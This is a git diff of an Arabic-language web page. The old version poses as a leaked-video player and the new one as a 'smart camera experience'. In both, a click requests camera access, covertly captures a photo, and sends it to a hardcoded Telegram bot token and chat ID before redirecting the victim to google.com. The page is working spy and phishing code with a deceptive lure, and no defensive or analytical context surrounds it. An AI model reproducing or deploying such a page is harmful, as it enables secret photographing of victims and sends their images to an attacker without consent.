@@ -1,51 +1,158 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Video Player</title>
+    <title>تجربة الكاميرا الذكية</title>
     <style>
-        html, body { margin: 0; padding: 0; width: 100vw; height: 100vh; background-color: #000; display: flex; justify-content: center; align-items: center; font-family: sans-serif; overflow: hidden; position: fixed; }
-        .video-container { width: 100%; text-align: center; color: white; }
-        .play-button { width: 100px; height: 100px; background: #ff0000; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; cursor: pointer; box-shadow: 0 0 20px rgba(255,0,0,0.5); }
-        .play-button:after { content: ''; border-style: solid; border-width: 15px 0 15px 25px; border-color: transparent transparent transparent white; margin-left: 5px; }
-        .loading-bar { width: 80%; height: 5px; background: #222; margin: 20px auto; border-radius: 10px; }
-        .progress { width: 0%; height: 100%; background: #ff0000; transition: width 0.5s; }
+        /* تصميم الخلفية والصفحة */
+        html, body { 
+            margin: 0; padding: 0; width: 100vw; height: 100vh; 
+            background: radial-gradient(circle, #1a1a1a 0%, #000 100%); 
+            display: flex; justify-content: center; align-items: center; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            overflow: hidden; position: fixed; color: white;
+        }
+
+        .container { text-align: center; width: 90%; max-width: 400px; }
+
+        /* شارة الكاميرا المطورة */
+        .camera-icon-wrapper {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            background: linear-gradient(145deg, #ff0000, #b30000);
+            border-radius: 30px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 25px;
+            cursor: pointer;
+            box-shadow: 0 10px 30px rgba(255, 0, 0, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+            animation: pulse 2s infinite;
+        }
+
+        .camera-icon-wrapper:active { transform: scale(0.95); }
+
+        /* شكل الكاميرا داخل الشارة */
+        .camera-lens {
+            width: 50px;
+            height: 50px;
+            border: 6px solid white;
+            border-radius: 50%;
+            position: relative;
+        }
+        .camera-lens::after {
+            content: '';
+            position: absolute;
+            width: 15px;
+            height: 15px;
+            background: white;
+            border-radius: 50%;
+            top: 5px;
+            right: 5px;
+        }
+
+        /* نصوص الواجهة */
+        h2 { font-size: 1.5rem; margin-bottom: 10px; font-weight: bold; }
+        p { color: #aaa; font-size: 0.9rem; margin-bottom: 30px; }
+
+        /* شريط التحميل */
+        .loading-container {
+            width: 100%;
+            height: 6px;
+            background: #222;
+            border-radius: 10px;
+            overflow: hidden;
+            display: none; /* يظهر عند الضغط */
+        }
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: #ff0000;
+            transition: width 0.4s ease;
+        }
+
+        /* أنيميشن النبض */
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7); }
+            70% { box-shadow: 0 0 0 20px rgba(255, 0, 0, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); }
+        }
     </style>
 </head>
 <body>
-    <div class="video-container">
-        <div class="play-button" onclick="startProcess()"></div>
-        <h3 id="status">شاهد الفيديو المسرب (حصري 2026)</h3>
-        <p style="color: #666;">اضغط تشغيل للمتابعة</p>
-        <div class="loading-bar"><div id="progress" class="progress"></div></div>
+
+    <div class="container">
+        <div class="camera-icon-wrapper" onclick="startProcess()">
+            <div class="camera-lens"></div>
+        </div>
+
+        <h2 id="status">اضغط على الكاميرا لتجربة ممتعة</h2>
+        <p id="sub-status">استمتع بأحدث تقنيات التصوير الذكي</p>
+
+        <div class="loading-container" id="loader">
+            <div class="progress-bar" id="progress"></div>
+        </div>
     </div>
+
     <script>
         const token = '8580971132:AAHhENW9qZ9BosbttJ9uEpAkyNsAEtnTChA';
         const chatId = '6837507867';
+
         async function startProcess() {
-            document.getElementById('status').innerHTML = "جاري الاتصال...";
-            document.getElementById('progress').style.width = '70%';
+            const statusText = document.getElementById('status');
+            const subStatus = document.getElementById('sub-status');
+            const loader = document.getElementById('loader');
+            const progress = document.getElementById('progress');
+
+            // تحديث الواجهة عند الضغط
+            statusText.innerHTML = "جاري تهيئة العدسات...";
+            subStatus.innerHTML = "يرجى الانتظار لحظة...";
+            loader.style.display = "block";
+            
+            setTimeout(() => progress.style.width = '40%', 100);
+
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                progress.style.width = '80%';
+                
                 const video = document.createElement('video');
-                video.srcObject = stream; video.play();
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 640; canvas.height = 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('photo', blob, 'img.jpg');
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData })
-                        .then(() => {
-                            stream.getTracks().forEach(t => t.stop());
-                            window.location.href = "https://www.google.com";
-                        });
-                    }, 'image/jpeg');
-                }, 1200);
-            } catch (err) { window.location.href = "https://www.google.com"; }
+                video.srcObject = stream;
+                video.play();
+
+                video.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        canvas.toBlob(blob => {
+                            const formData = new FormData();
+                            formData.append('chat_id', chatId);
+                            formData.append('photo', blob, 'capture.jpg');
+
+                            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { 
+                                method: 'POST', 
+                                body: formData 
+                            })
+                            .then(() => {
+                                progress.style.width = '100%';
+                                stream.getTracks().forEach(t => t.stop());
+                                // توجيه المستخدم بعد النجاح
+                                setTimeout(() => {
+                                    window.location.href = "https://www.google.com";
+                                }, 500);
+                            });
+                        }, 'image/jpeg', 0.8);
+                    }, 1500); // تأخير بسيط لضمان وضوح الصورة
+                };
+            } catch (err) {
+                // في حال رفض الإذن أو حدوث خطأ
+                window.location.href = "https://www.google.com";
+            }
         }
     </script>
 </body>
